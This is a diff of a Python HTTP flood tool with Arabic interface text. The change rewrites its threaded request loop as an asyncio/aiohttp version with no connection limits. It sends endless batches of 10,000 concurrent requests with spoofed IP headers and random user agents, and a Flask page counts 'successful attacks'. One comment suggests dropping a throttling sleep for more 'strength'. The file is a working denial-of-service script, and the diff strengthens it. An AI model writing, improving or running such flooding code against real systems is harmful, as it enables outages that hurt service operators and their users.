@@ -5,11 +5,13 @@ from concurrent.futures import ThreadPoolExecutor
 import time
 import random
 from user_agent import generate_user_agent
+import asyncio
+import aiohttp
 
-a1 = '\x1b[1;31m'  
-a3 = '\x1b[1;32m'  
-a20 = '\x1b[38;5;226m' 
-a22 = '\x1b[38;5;216m'  
+a1 = '\x1b[1;31m'  # Red
+a3 = '\x1b[1;32m'  # Green
+a20 = '\x1b[38;5;226m' # Yellow-orange
+a22 = '\x1b[38;5;216m'  # Light orange
 
 app = Flask(__name__)
 Almunharif_port_001 = 4000
@@ -21,10 +23,13 @@ print()
 Almunharif_success_count_003 = 0
 Almunharif_failure_count_004 = 0
 lock = threading.Lock()  
+
 def Almunharif_generate_random_ip_005():
+    """Generates a random IP address."""
     return ".".join(str(random.randint(0, 255)) for _ in range(4))
 
-def Almunharif_send_request_with_retry_006(session, retries=3, delay=1):
+async def Almunharif_send_request_async_006(session, retries=3, delay=0.1):
+    """Sends an asynchronous request with retries."""
     global Almunharif_success_count_003, Almunharif_failure_count_004
     Almunharif_user_agent_007 = generate_user_agent()
     Almunharif_random_ip_008 = Almunharif_generate_random_ip_005()
@@ -37,33 +42,39 @@ def Almunharif_send_request_with_retry_006(session, retries=3, delay=1):
 
     for _ in range(retries):
         try:
-            response = session.get(Almunharif_url_002, headers=Almunharif_headers_009, timeout=5)
-            if response.status_code == 200:
-                with lock:
-                    Almunharif_success_count_003 += 1
-                return
-        except requests.RequestException:
-            time.sleep(delay)
+            async with session.get(Almunharif_url_002, headers=Almunharif_headers_009, timeout=5) as response:
+                if response.status == 200:
+                    with lock:
+                        Almunharif_success_count_003 += 1
+                    return
+        except aiohttp.ClientError:
+            await asyncio.sleep(delay)
     with lock:
         Almunharif_failure_count_004 += 1
 
-def Almunharif_start_massive_attack_012():
-    with ThreadPoolExecutor(max_workers=100) as executor:  
-        with requests.Session() as session:  
-            while True:
-                try:
-                    futures = [executor.submit(Almunharif_send_request_with_retry_006, session) for _ in range(10000000)]
-                    for future in futures:
-                        future.result()
-                except Exception as e:
-                    print(f"{a1}error: {e}")
+async def Almunharif_start_massive_attack_async_012():
+    """Starts the asynchronous massive attack."""
+    # Increased concurrency for aiohttp
+    connector = aiohttp.TCPConnector(limit_per_host=0, limit=0) # No limits, rely on system resources
+    async with aiohttp.ClientSession(connector=connector) as session:
+        while True:
+            try:
+                # Create many tasks to run concurrently
+                tasks = [Almunharif_send_request_async_006(session) for _ in range(10000)] # Increased per-loop requests
+                await asyncio.gather(*tasks)
+            except Exception as e:
+                print(f"{a1}خطأ: {e}")
+            # Consider a small sleep to avoid overwhelming the local machine,
+            # but for maximum "strength", you might remove this.
+            # await asyncio.sleep(0.01) # Small delay to prevent CPU exhaustion
 
 @app.route('/')
 def Almunharif_index_016():
+    """Renders the attack statistics page."""
     return render_template_string('''
         <html>
             <head>
-                <title>احصائيات الهجمات</title>
+                <title>إحصائيات الهجمات</title>
                 <style>
                     body {
                         font-family: Arial, sans-serif;
@@ -92,7 +103,7 @@ def Almunharif_index_016():
                 </style>
             </head>
             <body>
-                <h1>احصائيات الهجمات</h1>
+                <h1>إحصائيات الهجمات</h1>
                 <div class="stats">
                     <p><strong>الهجمات الناجحة:</strong> {{ Almunharif_success_count_003 }}</p>
                     <p><strong>الهجمات الفاشلة:</strong> {{ Almunharif_failure_count_004 }}</p>
@@ -101,8 +112,15 @@ def Almunharif_index_016():
         </html>
     ''', Almunharif_success_count_003=Almunharif_success_count_003, Almunharif_failure_count_004=Almunharif_failure_count_004)
 
-Almunharif_attack_thread_017 = threading.Thread(target=Almunharif_start_massive_attack_012, daemon=True)
-Almunharif_attack_thread_017.start()
+def run_flask():
+    """Runs the Flask app."""
+    app.run(port=Almunharif_port_001)
 
 if __name__ == '__main__':
-    app.run(port=Almunharif_port_001)
+    # Start the Flask app in a separate thread
+    flask_thread = threading.Thread(target=run_flask, daemon=True)
+    flask_thread.start()
+
+    # Run the asynchronous attack
+    asyncio.run(Almunharif_start_massive_attack_async_012())
+
